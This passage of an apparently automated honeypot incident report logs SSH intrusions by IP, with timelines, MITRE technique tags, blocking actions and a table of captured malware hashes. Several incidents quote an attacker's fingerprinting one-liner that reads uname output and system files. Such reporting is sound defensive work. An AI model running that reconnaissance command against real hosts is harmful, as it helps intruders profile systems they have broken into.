- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5bf19082bc

| Field | Detail |
|---|---|
| **Source IP** | `50.223.176[.]171` |
| **First Seen** | 2026-07-14 20:47 |
| **Last Seen** | 2026-07-14 20:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:47:20` | `cowrie.session.connect` |
| `2026-07-14 20:47:21` | `cowrie.client.version` |
| `2026-07-14 20:47:21` | `cowrie.client.kex` |
| `2026-07-14 20:47:22` | `cowrie.login.success` |
| `2026-07-14 20:47:23` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.223.176[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.223.176[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecbd7a081a5a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:47 |
| **Last Seen** | 2026-07-14 20:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:47:22` | `cowrie.session.connect` |
| `2026-07-14 20:47:22` | `cowrie.client.version` |
| `2026-07-14 20:47:22` | `cowrie.client.kex` |
| `2026-07-14 20:47:23` | `cowrie.login.success` |
| `2026-07-14 20:47:25` | `cowrie.session.params` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.success` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.command.input` |
| `2026-07-14 20:47:25` | `cowrie.log.closed` |
| `2026-07-14 20:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-658c29e725c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:48 |
| **Last Seen** | 2026-07-14 20:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:48:49` | `cowrie.session.connect` |
| `2026-07-14 20:48:49` | `cowrie.client.version` |
| `2026-07-14 20:48:49` | `cowrie.client.kex` |
| `2026-07-14 20:48:50` | `cowrie.login.success` |
| `2026-07-14 20:48:52` | `cowrie.session.params` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.success` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.command.input` |
| `2026-07-14 20:48:52` | `cowrie.log.closed` |
| `2026-07-14 20:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a61d62d5ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:50 |
| **Last Seen** | 2026-07-14 20:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:50:19` | `cowrie.session.connect` |
| `2026-07-14 20:50:19` | `cowrie.client.version` |
| `2026-07-14 20:50:19` | `cowrie.client.kex` |
| `2026-07-14 20:50:21` | `cowrie.login.success` |
| `2026-07-14 20:50:22` | `cowrie.session.params` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.success` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.command.input` |
| `2026-07-14 20:50:22` | `cowrie.log.closed` |
| `2026-07-14 20:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7daa41f1b103

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:51 |
| **Last Seen** | 2026-07-14 20:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:51:51` | `cowrie.session.connect` |
| `2026-07-14 20:51:51` | `cowrie.client.version` |
| `2026-07-14 20:51:51` | `cowrie.client.kex` |
| `2026-07-14 20:51:52` | `cowrie.login.success` |
| `2026-07-14 20:51:54` | `cowrie.session.params` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.success` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.command.input` |
| `2026-07-14 20:51:54` | `cowrie.log.closed` |
| `2026-07-14 20:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f1f2fd91c7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:53 |
| **Last Seen** | 2026-07-14 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:53:23` | `cowrie.session.connect` |
| `2026-07-14 20:53:23` | `cowrie.client.version` |
| `2026-07-14 20:53:23` | `cowrie.client.kex` |
| `2026-07-14 20:53:25` | `cowrie.login.success` |
| `2026-07-14 20:53:26` | `cowrie.session.params` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.success` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:26` | `cowrie.command.input` |
| `2026-07-14 20:53:27` | `cowrie.log.closed` |
| `2026-07-14 20:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a73d732f64d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:54 |
| **Last Seen** | 2026-07-14 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:54:50` | `cowrie.session.connect` |
| `2026-07-14 20:54:51` | `cowrie.client.version` |
| `2026-07-14 20:54:51` | `cowrie.client.kex` |
| `2026-07-14 20:54:52` | `cowrie.login.success` |
| `2026-07-14 20:54:53` | `cowrie.session.params` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.success` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:53` | `cowrie.command.input` |
| `2026-07-14 20:54:54` | `cowrie.log.closed` |
| `2026-07-14 20:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.233[.]61` | **28** | 2026-07-14 18:55 | 2026-07-14 20:44 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `103.72.147[.]224` | **8** | 2026-07-14 19:51 | 2026-07-14 19:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.61.192[.]156` | **6** | 2026-07-14 19:05 | 2026-07-14 20:50 | 7m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-14 19:01 | 2026-07-14 20:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]205` | **3** | 2026-07-14 20:03 | 2026-07-14 20:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-07-14 20:27 | 2026-07-14 20:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-07-14 19:17 | 2026-07-14 19:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.32[.]130` | 1 | 2026-07-14 20:34 | 2026-07-14 20:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.239.169[.]52` | 1 | 2026-07-14 19:09 | 2026-07-14 19:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]54` | 1 | 2026-07-14 19:51 | 2026-07-14 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `147.139.136[.]75` | 1 | 2026-07-14 20:36 | 2026-07-14 20:38 | 63s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]221` | 1 | 2026-07-14 19:57 | 2026-07-14 19:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-07-14 19:08 | 2026-07-14 19:09 | 9s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-14 20:31 | 2026-07-14 20:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-14 20:44 | 2026-07-14 20:44 | 3s | 0 | `T1592` | 🟢 LOW |
| `217.150.47[.]21` | 1 | 2026-07-14 19:43 | 2026-07-14 19:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.153.103[.]109` | 1 | 2026-07-14 19:31 | 2026-07-14 19:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.180.166[.]214` | 1 | 2026-07-14 19:10 | 2026-07-14 19:11 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.90.163[.]37` | 1 | 2026-07-14 19:04 | 2026-07-14 19:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-14 20:34 | 2026-07-14 20:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-14 18:55 | 2026-07-14 18:57 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
